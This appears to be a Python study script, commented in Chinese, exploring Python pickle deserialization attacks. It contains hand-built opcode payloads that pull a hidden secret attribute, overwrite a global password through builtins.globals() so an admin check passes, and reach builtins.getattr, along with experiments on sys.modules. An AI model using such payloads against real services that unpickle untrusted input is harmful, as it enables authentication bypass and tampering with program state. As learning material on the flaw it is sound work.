import pickle
import pickletools
import traceback


class secret:
    pwd = "???"

class Target1:
    def __init__(self):
        self.pwd = secret.pwd

test = Target1()

serialized = pickletools.optimize(pickle.dumps(test, protocol=3))
print(serialized)
pickletools.dis(serialized)
'''
结果
b'\x80\x03c__main__\nTarget1\n)\x81}X\x03\x00\x00\x00pwdX\x03\x00\x00\x00???sb.'

payload
b'\x80\x03c__main__\nTarget1\n)\x81}X\x03\x00\x00\x00pwdcsecret\npwd\nsb.'
'''
print('————————————————————————————————————————————————————————————————————————')
pickletools.dis(pickletools.optimize(b'\x80\x03c__main__\nTarget1\n)\x81}X\x03\x00\x00\x00pwdcsecret\npwd\nsb.'))
print('pickle pwd -> ' + pickle.loads(b'\x80\x03c__main__\nTarget1\n)\x81}X\x03\x00\x00\x00pwdcsecret\npwd\nsb.').pwd)



print('————————————————————————————————————————————————————————————————————————')

PWD = "???"  # 已打码

class Target2:
    PWD_TEST = 111
    def __init__(self, ser=None):
        if ser:
            obj = pickle.loads(ser)  # 输入点
            print(type(obj))
            if obj.pwd == PWD:
                print("Hello, admin!")

class Target2_test:
    PWD_TEST = 111

# import builtins
# builtins.globals()["PWD"] = ""  # 先把 PWD 改成一个值
# obj.pwd = ""  # 再让 obj.pwd 也等于这个值
# print(__import__('builtins').globals())

# payload: b'\x80\x03cbuiltins\nglobals\n)R(VPWD\nVwi1\nu0c__main__\nTarget2\n)\x81}(Vpwd\nVwi1\nub.'
payload2 = b'\x80\x03cbuiltins\nglobals\n)R(VPWD\nVwi1\nu0c__main__\nTarget2\n)\x81}(Vpwd\nVwi1\nub.'
import builtins
pickletools.dis(pickletools.optimize(pickle.dumps(builtins.getattr, protocol=3)))

print('————————————————————————————————————————————————————————————————————————')
print(payload2)
pickletools.dis(payload2)
Target2(payload2)

print('————————————————————————————————————————————————————————————————————————')

print(b'(c__main__\nTarget2_test\nVPWD_TEST\nibuiltins\ngetattr\n.')
pickletools.dis(b'(c__main__\nTarget2_test\nVPWD_TEST\nibuiltins\ngetattr\n.')


print(pickle.loads(b'(c__main__\nTarget2_test\nVPWD_TEST\nibuiltins\ngetattr\n.'))
# payload: b'(c__main__\nTarget2_test\nVPWD_TEST\nibuiltins\ngetattr\n.'

print('————————————————————————————————————————————————————————————————————————')

import sys
print(sys.modules)
import sys
p0 = sys.modules
p0["sys"] = p0
import sys
p0["sys"] = sys.get("os")


print('Target2.__dict__  -> ' + str(type(Target2.__dict__)))
print('Target2().__dict__ -> ' + str(type(Target2().__dict__)))
try:
    Target2.__dict__['A'] = 1
except:
    traceback.print_exc()
    '''
    Traceback (most recent call last):
      File "C:\Users\Lenovo\PycharmProjects\pythonProject\demo\opcode_test.py", line 85, in <module>
        Target2.__dict__['A'] = 1
    TypeError: 'mappingproxy' object does not support item assignment
    '''